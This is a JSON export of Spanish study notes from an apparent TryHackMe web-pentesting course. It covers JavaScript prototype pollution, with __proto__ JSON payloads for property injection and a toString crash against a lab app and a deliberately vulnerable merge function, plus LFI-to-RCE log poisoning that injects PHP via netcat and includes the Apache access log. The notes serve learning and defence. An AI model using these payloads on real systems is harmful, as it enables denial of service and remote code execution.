    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "En el apasionante mundo de la ciberseguridad, donde los hackers y pentesters vagan en busca de vulnerabilidades, hay un concepto en evoluci√≥n conocido como contaminaci√≥n de prototipo. Esto permite a los actores maliciosos manipular y explotar el funcionamiento interno de las aplicaciones JavaScript y habilita a los atacantes a ganar acceso a informaci√≥n sensible y al backend.\n\nMientras que prototype pollution se ve en el contexto de JavaScript, el concepto puede extrapolarse a cualquier sistema que use un [modelo de herencia basado en prototipo](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain).\n\nSin embargo, el amplio uso de JavaScript, particularmente en el desarrollo web y su modelo de objetos flexible y din√°mico hacen el protorype pollution un problema m√°s prominente  y relevante en este lenguaje. En contraste, los lenguajes con [herencia basada en clases](https://en.wikipedia.org/wiki/Class-based_programming) suelen ser est√°ticosy alterar una clase durante el periodo de ejecuci√≥n no es una pr√°ctica com√∫n.\n\n--------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad aprenderemos los siguientes conceptos:\n\n- C√≥mo funciona la contaminaci√≥n de prototipos.\n- Riesgos potenciales de las aplicaciones web.\n- T√©cnicas de explotaci√≥n (del lado del cliente y del servidor).\n- T√©cnicas de mitigaci√≥n.\n\n--------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. Protocols and Servers]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]",
    "modified": "2026-01-28T00:56:07"
  },
  {
    "title": "3. How it Works",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/3-how-it-works/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/3. How it Works.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "Ahora que entendemos el JavaScript necesario, profundizaremos en la contaminaci√≥n de prototipo usando el mismo ejemplo de la red social. \n\n>[!IMPORTANT] **Prototype Pollution** por s√≠ misma no siempre presenta una amenaza explotable directamente. Sin embargo, su potencal de da√±ar se vuelve pronunciado cuando se une con otro tipo de vulnerabilidades como XSS y CSRF.\n\n---------------------------------------\n<h2>Un Ejemplo Com√∫n</h2>\nAsumamos que tenemos un prototipo b√°sico para `Person` con un m√©todo `introduce`. El atacante apunta a manipular el comportamiento del m√©todo `introduce` en todas las instancias alterando el prototipo.\n\n```javascript\n//Base Prototype for Persons\nlet personPrototype = {\n  introduce: function() {\n    return `Hi, I'm ${this.name}.`;\n  }\n};\n\n// Person Constructor Function\nfunction Person(name) {\n  let person = Object.create(personPrototype);\n  person.name = name;\n  return person;\n}\n\n// Creating an instance\nlet ben = Person('Ben');\n```\n\nCopia el c√≥digo, c√≥pialo en la consola y presiona enter. Cuando creamos un nuevo objeto, `ben`, y llamamos al m√©todo `introduce`, muestra `Hi, I'm Ben`, como se muestra en la siguiente figura.\n\n![[Pasted image 20260204172007.png]]\n\nSi un atacante inyecta contenido malicioso en el m√©todo `introduce` para todas las instancias usando la propiedad `__proto__`. En JavaScript, la propiedad `__proto__` es un m√©todo com√∫n para acceder al prototipo del objeto, esencialmente apuntando al objeto desde el cual hereda las propiedades y m√©todos. Si el atacante consigue ejecutar el siguiente c√≥digo usando cualquier vector de ataque:\n\n```javascript\n// Attacker's Payload\nben.__proto__.introduce=function(){console.log(\"You've been hacked, I'm Bob\");}\nconsole.log(ben.introduce()); \n```\n\nVeamos qu√© est√° pasando en el backgorund:\n\n- **Prototype Definition:** El prototipo `Person` se define inicialmente con un m√©todo `introduce` inocuo.\n- **Object Instantiation:** Una instancie de `Person` es creada con el nombre `'Ben' (let ben = Person('Ben');)`.\n- **Prototype Pollution Attack:** El atacante inyecta un payload malicioso en el m√©todo `introduce` del prototipo, cambiando su comportamiento para mostrar un mensaje da√±ino. Hemos contaminado usando la propiedad `__proto__`.\n- **Impact on Existing Instances:** Como resultado, incluso la instancia ya existente (`ben`) es afectada, y llamar a `ben.introduce()` ahora muestra el mensaje del atacante.",
    "modified": "2026-02-05T01:05:07"
  },
  {
    "title": "5. Exploitation - Property Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/5-exploitation-property-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/5. Exploitation - Property Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "<h2>Algunas Funciones Importantes</h2>\n- **Object Recursive Merge:** Esta funci√≥n involucra combinar propiedades de forma recursiva de un objeto \"fuente\" hacia un objeto \"objetivo\". Un atacante puede explotar esta funcionalidad si la funci√≥n de combinar no valida los inputs y permite mezclar propiedades en la cadena del prototipo. Considerando el mismo c√≥digo de una red social, sup√≥n que la aplicaci√≥n tiene una funci√≥n para combinar ajustes de usuario.\n\n```javascript\n// Vulnerable recursive merge function\nfunction recursiveMerge(target, source) {\n    for (let key in source) {\n        if (source[key] instanceof Object) {\n            if (!target[key]) target[key] = {};\n            recursiveMerge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n}\n\n// Endpoint to update user settings\napp.post('/updateSettings', (req, res) => {\n    const userSettings = req.body; // User-controlled input\n    recursiveMerge(globalUserSettings, userSettings);\n    res.send('Settings updated!');\n});\n```\n\nUn atacante manda una petici√≥n con un objeto anidado que contiene `__proto__`:\n\n```javascript\n{\"__proto__\": { \"newProperty\": \"value\" } } \n```\n\n- **Object Clone:** La clonaci√≥n de objetos es una funcionalidad similar que permite que operaciones profundas de clonaci√≥n copien propiedades de una cadena de prototipos a otra sin avisar. Estas funciones s√≥lo deber√≠an clonar las propiedades definidas por el usuario de un objeto y filtrar las palabras especiales como `__proto__`, `constructor`, etc.\n\n-------------------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\nAhora veremos de forma pr√°ctica c√≥mo los atacantes explotan esta vulnerabilidad. Exploraremos la funcionalidad de clonar √°lbum. Esta permite a los usuarios clonar un √°lbum dando un nuevo nombre.\n\n![[Pasted image 20260205193518.png]]\n\nExploraremos el c√≥digo del lado del cliente y del servidor.\n\n```html\n<form action=\"/clone-album/1\" method=\"post\" class=\"mb-4\">\n\t<h2 class=\"mb-3\">Clone Album of Josh</h2>\n\t<div class=\"form-group\">\n\t\t<label for=\"selectedAlbum\">Select an Album to Clone:</label>\n\t\t<select class=\"form-control\" name=\"selectedAlbum\" id=\"selectedAlbum\">\n\t\t\t\t<option value=\"Trip to US\">\n\t\t\t\t\tTrip to US\n\t\t\t\t</option>\n\t\t</select>\n\t</div>\n\t<div class=\"form-group\">\n\t\t<label for=\"newAlbumName\">New Album Name:</label>\n\t\t<input type=\"text\" class=\"form-control\" name=\"newAlbumName\" id=\"newAlbumName\"\n\t\t\tplaceholder=\"Enter new album name\">\n\t</div>\n\t<button type=\"submit\" class=\"btn btn-primary\">Clone Album</button>\n</form>\n```\n\nEl c√≥digo del lado del cliente toma el nombre como input y llama al endpoint de la API `/clone-album/{album_ID}` para clonarlo. Como hemos visto, PP es raramente explotable por s√≠ sola. Sin embargo, al combinarse con otros vectores de ataque puede resultar en una mayor superficie de ataque. Veamos ahora el c√≥digo del lado del servidor.\n\n```javascript\napp.post(\"/clone-album/:friendId\", (req, res) => {\n  const { friendId } = req.params;\n  const { selectedAlbum, newAlbumName } = req.body;\n  const friend = friends.find((f) => f.id === parseInt(friendId));\n  if (!friend) {\n    console.log(\"Friend not found\");\n    return res.status(404).send(\"Friend not found\");\n  }\n  const albumToClone = friend.albums.find(\n    (album) => album.name === selectedAlbum\n  );\n  if (albumToClone && newAlbumName) {\n    let clonedAlbum = { ...albumToClone };\n    try {\n      const payload = JSON.parse(newAlbumName);\n      merge(clonedAlbum, payload);\n    } catch (e) {\n    }\n\nfunction merge(to, from) {\n  for (let key in from) {\n    if (typeof to[key] == \"object\" && typeof from[key] == \"object\") {\n      merge(to[key], from[key]);\n    } else {\n      to[key] = from[key];\n    }\n  }\n  return to;\n}\n```\n\nEn el c√≥digo de arriba, los servidores reciben un objeto JSON con el nombre del √°lbum, copian dicho √°lbum en otro objeto y cambian el nombre del √°lbum reci√©n creado llamando a la funci√≥n `merge`.\n\nSabemos que la funci√≥n `merge` es un candidato ideal para PP si copia los objetos y propiedades sin sanitizar el input. ¬øQue pasar√≠a por lo tanto si mandamos una petici√≥n que contenga `__proto__` con `newProperty`?\n\n```javascript\n{\"__proto__\": {\"newProperty\": \"hacked\"}}\n```\n\nLa funci√≥n `merge` considerar√° `__proto__` como una propiedad y llamar√° a `obj.__proto__.newProperty=value`. Haciendo esto, `newProperty` no se a√±ade directamente al objeto `friend`. En su lugar, se a√±ade al prototipo del objeto. Esto significa que `newProperty` no es visiblemente parte de las propiedades de `friend` (como s√≠ lo son `name`, `age`, etc) pero sigue siendo accesible. Clonemos un √°lbum visitando el perfil de Josh y usando el payload de arriba como nombre del √°lbum.\n\n![[Pasted image 20260205201432.png]]\n\n¬°Ah√≠ est√°! Tenemos una nueva propiedad para todos los objetos `friend`.\n\n- **Efecto sobre todos los objetos del mismo tipo:** Como todos los objetos `frind` se crean del mismo prototipo, a√±adir `newProperty` al prototipo significa que todos los objetos `friend` ahora tienen acceso a `newProperty`.\n- **Observar el cambio:** Aunque `newProperty` no es visible directamente al imprimir el objeto `friend`, est√° ah√≠. Puedes acceder a √©l llamando a `friend.newProperty`, lo que mostrar√° `testValue`.\n- **C√≥mo se vuelve visible newProperty:** Cuando a√±ades `newProperty` v√≠a el prototipo, no existe directamente en los objetos individuales. Sin embargo, cuando accedes a una propiedad del objeto, JavaScript busca primero entre las propiedades del objeto y si no la encuentra busca en las propiedades del prototipo. Si no lo encuentra mira en la cadena de prototipos hasta que lo encuentra o llega al final.\n- **Renderizado en pantalla:** En la plantilla [EJS](https://ejs.co/), cuando ciclas todas las propiedades de un objeto `friend` usando un bucle `for...in` (`<% for (let key in friend) { %> ...<% } %>`) y las muestra, este bucle itera sobre todas las propiedades enumerables de un objeto, incluyendo aquellas heredadas del prototipo.\n\nEn esta tarea hemos aprendido c√≥mo a√±adir nuevas propiedades al prototipo de un objeto para contaminar la estructura general. En la siguiente tarea veremos como crashear una aplicaci√≥n si el desarrollador no toma las medidas necesarias",
    "modified": "2026-02-06T01:03:26"
  },
  {
    "title": "7. Automating the Process",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/7-automating-the-process/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/7. Automating the Process.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "<h2>Mayores Problemas durante la Indentificaci√≥n</h2>\nIdentificar PP es un problema en cualquier lenguaje, especialmente en JavaScript debido a la forma con la que este permite que un objeto comparta sus funcionalidades con otro. Detectar este problema autom√°ticamente con software es muy complicado porque no es preciso. Cada web o aplicaci√≥n es diferente e intuir d√≥nde puede ocurrir PP puede requerir que alguien examine de cerca el c√≥digo.\n\nAl contrario que otros problemas de seguridad que pueden ser encontrados buscando patrones espec√≠ficos requiere que un pentester o desarrollador eche un vistazo exhaustivo al c√≥digo.\n\n----------------------------------------\n<h2>Algunos Scripts Importantes</h2>\nMuchas herramientas y proyectos han sido desarrollados por comunidades open source para ayudar en la identificaci√≥n de estas vulnerabilidades. Aqu√≠ algunas cuantas con renombre en GitHub:\n\n- **[NodeJsScan](https://github.com/ajinabraham/nodejsscan):** Es un esc√°ner est√°tico de c√≥digo para aplicaciones Node.js. Incluye comprobaciones de varias vulnerabilidades, incluyendo PP. \n- **[Prototype Pollution Scanner](https://github.com/KathanP19/protoscan):** Es una herramienta dise√±ada para escanear c√≥digo JavaScript en busca de vulnerabilidades de PP. Puede ser usada para analizar c√≥digo en busca de patrones que son susceptibles de ella.\n- **[PPFuzz](https://github.com/dwisiswant0/ppfuzz):** Es un fuzzer dise√±ado para automatizar el proceso de detectar PP en aplicaciones web. Fuzzeando vectores de input que puedan interactuar con propiedades de objetos, `PPFuzz` puede ayudar a identificar vectores de ataque.\n- **[BlackFan](https://github.com/BlackFan/client-side-prototype-pollution):** Est√° enfocada en identificar vulnerabilidades de PP en el lado del cliente. Incluye ejemplos de c√≥mo puede ser explotada en navegadores para realizar ataques XSS, por ejemplo.\n\nAl identificar prototype pollution, el pentester deber√≠a buscar instancias donde el input controlado por el usuario pueda influir las claves o propiedades para que se mezclen, definan o clonen.",
    "modified": "2026-02-09T01:09:24"
  },
  {
    "title": "2. Essential Recap",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/2-essential-recap/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/2. Essential Recap.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "Antes de pasar a conceptos avanzados necesitamos entender cosas b√°sicas en JavaScript. Piensa en los **objetos** como bloques de construcci√≥n que contienen informaci√≥n. La **herencia** es como pasar atributos de un objeto a otro.Las **funciones** son herramientas que pueden usarse individualmente o como parte de estos objetos. Por √∫ltimo, las **clases** son como planos que nos ayudan a hacer cosas iguales f√°cilmente.\n\n---------------------------------------------\n<h2>Objetos</h2>\nEn JavaScript los objetos son contenedores que pueden contener diferentes piezas de informaci√≥n. Imagina un perfil de una red social como un objeto, donde cada perfil tiene propiedades como nombre, edad, y seguidores. Puedes representar esto usando `{}` y pares de clave-valor.\n\n```javascript\nlet user = {\n  name: 'Ben S',\n  age: 25,\n  followers: 200,\n  DoB: '1/1/1990'\n};\n```\n\nAqu√≠, `user` es un objeto con propiedades como `name`, `age` y `followers`. Estas propiedades almacenan informaci√≥n espec√≠fica sobre el usuario. Los objetos en JavaScript nos permiten organizar y gestionar informaci√≥n relacionada.\n\nPara testearlo, abrimos el navegador, hacemos click derecho e `Inspect` y nos vamos a `Console`, lo que abrir√° una ventana. Si copias el c√≥digo de arriba y lo pegas en la consola, crear√° un objeto `user`. Puedes acceder a sus propiedades usando `console.log`.\n\n![[Pasted image 20260130111755.png]]\n\n------------------------------------------------\n<h2>Clases</h2>\nEn JavaScript, las clases son como planos que nos ayudan a crear m√∫ltiples objetos con estructuras o comportamientos similares. Siguiendo con nuestro ejemplo de una red social, podemos usar una clase para definir un usuario gen√©rico y creador de contenido. Las clases ofrecen una forma conveniente de organizar e instanciar objetos con caracter√≠sticas compartidas.\n\n```javascript\n// Class for User \nclass UserProfile {\n  constructor(name, age, followers, dob) {\n    this.name = name;\n    this.age = age;\n    this.followers = followers;\n    this.dob = dob; // Adding Date of Birth\n  }\n}\n\n// Class for Content Creator Profile inheriting from User \nclass ContentCreatorProfile extends UserProfile {\n  constructor(name, age, followers, dob, content, posts) {\n    super(name, age, followers, dob);\n    this.content = content;\n    this.posts = posts;\n  }\n}\n\n// Creating instances of the classes\nlet regularUser = new UserProfile('Ben S', 25, 1000, '1/1/1990');\nlet contentCreator = new ContentCreatorProfile('Jane Smith', 30, 5000, '1/1/1990', 'Engaging Content', 50);\n```\n\nAhora, la clase `User` incluye la fecha de nacimiento `dob` como parte de sus propiedades y la clase `ContentCreatorProfile` hereda esta propiedad. Al crear instancias de estas clases, podemos dar la fecha de nacimiento y otros detalles. Como podemos ver, incluir la DoB mejora el perfil del usuario con informaci√≥n adicional.\n\n-------------------------------------------------\n<h2>Prototipo</h2>\nEn JavaScript, cada objeto est√° relacionado con un objeto prototipo y estos prototipos forman una cadena com√∫nmente conocida como **cadena de prototipo**. El prototipo sirve como plantilla o plano para objetos. Cuando creas un objeto usando una funci√≥n constructor o una clase, JavaScript autom√°ticamente configura un link entre el objeto y su prototipo. En el contexto de nuestra red social, ilustremos c√≥mo funcionan los prototipos:\n\n```javascript\n// Prototype for User \nlet userPrototype = {\n  greet: function() {\n    return `Hello, ${this.name}!`;\n  }\n};\n\n// User Constructor Function\nfunction UserProfilePrototype(name, age, followers, dob) {\n  let user = Object.create(userPrototype);\n  user.name = name;\n  user.age = age;\n  user.followers = followers;\n  user.dob = dob;\n  return user;\n}\n\n// Creating an instance\nlet regularUser = UserProfilePrototype('Ben S', 25, 1000, '1/1/1990');\n\n// Using the prototype method\nconsole.log(regularUser.greet());\n```\n\nEste c√≥digo imprime: `Hello, Ben S`.\n\n-----------------------------------------------------\n<h2>Diferencia entre Clase y Prototipo</h2>\nLas clases y los prototipos en JavaScript son dos maneras de conseguir un objetivo similar: crear objetos con comportamientos y caracter√≠sticas. Imagina que est√°s construyendo modelos de coches. Usar clases es como tener un plano detallado o un conjunto de instrucciones para cada modelo de coche que quieres desarrollar. Todos los coches hechos con el mismo plano tienen de forma garantizada las mismas funcionalidades y comportamientos. Las clases en JavaScript funcionan as√≠.\n\nPor otro lado, los prototipos es como tener un modelo de coche b√°sico y despu√©s personalizarlo a√±adiendo o modificando funcionalidades directamente en el propio coche. Con los prototipos empiezas con un objeto sencillo y vas a√±adiendo comportamientos relacionando el objeto a un objeto prototipo que ya tiene esos comportamientos. Los objetos creados de esta manera est√°n relacionados a trav√©s de la cadena de prototipos permiti√©ndoles heredar comportamientos de otros objetos. Este m√©todo es m√°s din√°mico y flexible pero puede ser m√°s dif√≠cil de controlar y entender que las clases.\n\n-------------------------------------------\n<h2>Herencia</h2>\nEn JavaScript la herencia permite a un objeto heredar las propiedades de otro, creando una jerarqu√≠a de objetos relacionados. Continuando con nuestro ejemplo de una red social, consideremos un perfil m√°s espec√≠fico para un creador de contenido. Este nuevo objeto puede heredar propiedades desde un usuario normal, como `name` y `followers` y a√±adir propiedades particulares como `content` o `posts`.\n\n```javascript\nlet user = {\n  name: 'Ben S',\n  age: 25,\n  followers: 1000,\nDoB: '1/1/1990'\n};\n\n// Content Creator Profile inheriting from User \nlet contentCreatorProfile = Object.create(user);\ncontentCreatorProfile.content = 'Engaging Content';\ncontentCreatorProfile.posts = 50;\n```\n\nAqu√≠, `contentCreatorProfile` hereda las propiedades de `user` usando `Object.create()`. Ahora tiene propiedades espec√≠ficas como `content` y `posts` y hereda `name`, `age` y `followers` del usuario general.\n\n![[Pasted image 20260131212052.png]]\n\nDe esta manera, la herencia ayuda a crear un objeto m√°s especializado al reutilizar propiedades comunes del objeto padre. JavaScript soporta herencias basadas tanto en clases como en prototipos.\n\n- **Herencia basada en Prototipos:** En JavaScript cada objeto tiene un prototipo y cuando creas un nuevo objeto puedes especificar su prototipo. Los objetos heredan propiedades y m√©todos de su propio prototipo. Puedes usar el m√©todo `Object.create()` para crear un nuevo objeto con un prototipo especificado o puedes modificar directamente el prototipo de un objeto existente usando su propiedad de prototipo.\n- **Herencia basada en Clases:** JavaScript tambi√©n soporta las clases, las cuales ofrecen una sintaxis m√°s familiar para definir objetos y herencia. Las clases en JavaScript son una mejora sint√°ctica sobre la herencia basada en prototipos existente. Sin embargo, en esencia, las clases tambi√©n usan prototipos.\n\nEl siguiente diagrama representa la herencia basada en prototipos en JavaScript:\n\n![[Pasted image 20260131212319.png]]\n\n- **Definir el Objeto UserProfile:** Empezamos definiendo el objeto gen√©rico `UserProfile` que representa propiedades comunes compartidas por diferentes tipos de perfiles. En este ejemplo, `UserProfile` incluye propiedades como `email` y `password`, las cuales pueden ser comunes de todos los perfiles.\n- **Crear ContentCreatorProfile:** Creamos un perfil especializado llamado `ContentCreatorProfile`. Este perfil es espec√≠fico de los creadores de contenido y puede tener propiedades o comportamientos adicionales. Conseguimos esto creando `ContentCreatorProfile` usando `Object.create(UserProfile)`, lo que configura `UserProfile` como prototipo de `ContentCreatorProfile`.\n- **A√±adir Propiedades Adicionales:** Despu√©s de crear `ContentCreatorProfile` a√±adimos propiedades espec√≠ficas como `posts`. Esta propiedad es √∫nica de `ContentCreatorProfile` y no se hereda de `UserProfile`.\n- **Acceder a Propiedades:** Cuando accedemos a las propiedades de `ContentCreatorProfile`, JavaScript primero comprueba si la propiedad existe directamente en `ContentCreatorProfile`. Si no encuentra la propiedad ah√≠, busca en la cadena de prototipos. Por lo que `ContentCreatorProfile` hereda las propiedades `email` y `password` de `UserProfile` mientras tambi√©n tiene su propiedad √∫nica del n√∫mero de posts. Esto permite una estructura jer√°rquica donde los perfiles especializados heredan propiedades de aquellos m√°s gen√©ricos.\n\n![[Pasted image 20260201130706.png]]",
    "modified": "2026-02-02T01:07:37"
  },
  {
    "title": "6. Exploitation - Denial of Service",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/6-exploitation-denial-of-service/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/6. Exploitation - Denial of Service.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "<h2>Denegaci√≥n de Servicio</h2>\nPrototype pollution, una vulnerabilidad cr√≠tica en aplicaciones JavaScript, puede llevar a DoS, entre otras consecuencias. Esto ocurre cuando un atacante manipula el prototipo de un objeto ampliamente utilizado, causando que la aplicaci√≥n se comporte inesperadamente o que incluso crashee. En JavaScript, los objetos heredan propiedades y m√©todos de los prototipos, y alterar estos prototipos afecta directamente a los objetos.\n\nPor ejemplo, si un atacante contamina el m√©todo `Object.prototype.toString`, cada llamada posterior a este m√©todo por parte de cualquier objeto ejecutar√° el comportamiento alterado. En una aplicaci√≥n compleja donde `toString` es frecuentemente usada, esto puede llevar a resultados inesperados, potencialmente causando que la aplicaci√≥n funcione mal. El m√©todo `toString` es usado universalmente en JavaScript. \n\nSi el m√©todo contaminado lleva a un procesamiento ineficiente o a un bucle infinito, puede agotar los recursos del sistema causando un DoS. Adem√°s, puede interferir con la l√≥gica de negocio.\n\n---------------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n- De nuevo, visitaremos `http://IP:5000` y veremos si podemos crashear el servidor. Como ya hemos hablado, tenemos el m√©todo `Object.prototype.toString`.\n- Visitamos la p√°gina del perfil de cualquier amigo y podemos ver que as√≠ es como se comporta el cliente:\n\n```html\n<form action=\"/clone-album/1\" method=\"post\" class=\"mb-4\">\n\t<h2 class=\"mb-3\">Clone Album of Josh</h2>\n\t<div class=\"form-group\">\n\t\t<label for=\"selectedAlbum\">Select an Album to Clone:</label>\n\t\t<select class=\"form-control\" name=\"selectedAlbum\" id=\"selectedAlbum\">\n\t\t\t\t<option value=\"Trip to US\">\n\t\t\t\t\tTrip to US\n\t\t\t\t</option>\n\t\t</select>\n\t</div>\n\t<div class=\"form-group\">\n\t\t<label for=\"newAlbumName\">New Album Name:</label>\n\t\t<input type=\"text\" class=\"form-control\" name=\"newAlbumName\" id=\"newAlbumName\"\n\t\t\tplaceholder=\"Enter new album name\">\n\t</div>\n\t<button type=\"submit\" class=\"btn btn-primary\">Clone Album</button>\n</form>\n```\n\n- Vemos que esta funci√≥n lama a la funci√≥n `merge`. ¬øQu√© pasa si intentamos mandar un payload que sobrescriba una funci√≥n existente como `toString()` y luego la llamamos desde un objeto?\n- Para preparar el payload tomaremos un simple JSON:\n\n```javascript\n{\"__proto__\": {\"toString\": \"Just crash the server\"}}\n```\n\n- Vamos al perfil e introducimos el payload en lugar del nombre del √°lbum.\n  ![[Pasted image 20260205210406.png]]\n- Decodearemos el payload una vez que `app.js` reciba la petici√≥n, parsee el JSON y asigne el valor de la funci√≥n `toString` en la propiedad `__proto__` del objeto `friend`.\n- Esto crea un comportamiento abrupto ya que `toString` es ampliamente utilizada por diferentes objetos. Podemos hacer click en clonar el √°lbum y pasa lo siguiente:\n  ![[Pasted image 20260205211006.png]]\n- El `TypeError` que obtenemos es `Object.prototype.toString.call` is not a function, ya que hemos sobrescrito la funci√≥n usando PP.\n- Puedes sobrescribir muchas otras funciones incrustadas como `toJSON`, `valueOf`, `constructor`, etc, pero la aplicaci√≥n no crashear√° siempre. Depende de cu√°nto se use la funci√≥n que sobrescribes.",
    "modified": "2026-02-06T01:03:26"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/4-race-conditions/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/4. Race Conditions/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 4. Race Conditions",
    "content": "Para ver este curso ve a **THM -> 1. Career -> 2. Penetration Tester -> 1. Jr Penetration Tester -> 3. Introduction to Web Hacking -> 9. Race Conditions**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Race Conditions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/4-race-conditions/0-race-conditions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/4. Race Conditions/0. Race Conditions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 4. Race Conditions",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/0. Race Conditions]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/4. Race Conditions/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. LFI2RCE - Log Poisoning",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/6-lfi2rce-log-poisoning/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/6. LFI2RCE - Log Poisoning.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "El log poisoning es una t√©cnica donde el atacante inyecta c√≥digo ejecutable en el archivo de registro de un servidor web y usa una vulnerabilidad LFI para incluir y ejecutar este archivo de registro. Este m√©todo es particularmente sigiloso porque los archivos de registro se comparten y son aparentemente inofensivos. En un ataque de log poisoning, el atacante debe inyectar c√≥digo PHP malicioso en un archivo log. Una vez inyectado, puede usar una LFI para incluir el archivo como uno est√°ndar. Esto causa que el servidor ejecute el c√≥digo malicioso contenido en el archivo de registro, llevando a RCE.\n\nPor ejemplo, si un atacante manda una petici√≥n Netcat a una m√°quina vulnerable que contiene c√≥digo PHP:\n\n```bash\n$ nc MACHINE_IP 80\n```\n```php      \n<?php echo phpinfo(); ?>\n```\n```http\nHTTP/1.1 400 Bad Request\nDate: Thu, 23 Nov 2023 05:39:55 GMT\nServer: Apache/2.4.41 (Ubuntu)\nContent-Length: 335\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n```\n```html\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n<hr>\n<address>Apache/2.4.41 (Ubuntu) Server at MACHINE_IP.eu-west-1.compute.internal Port 80</address>\n</body></html>\n```\n\nEl c√≥digo ser√° registrado en el log de acceso del servidor.\n\n![[Pasted image 20260126131211.png]]\n\nEl atacante entonces usa LFI para incluir el archivo de registro de acceso: `?page=/var/log/apache2/access.log`.\n\n![[Pasted image 20260126131245.png]]\n\nPara replicar la demo de arriba puedes ir a `http://IP/playground.php`.",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "1. Web Application Architecture",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/1-web-application-architecture/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/1. Web Application Architecture.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
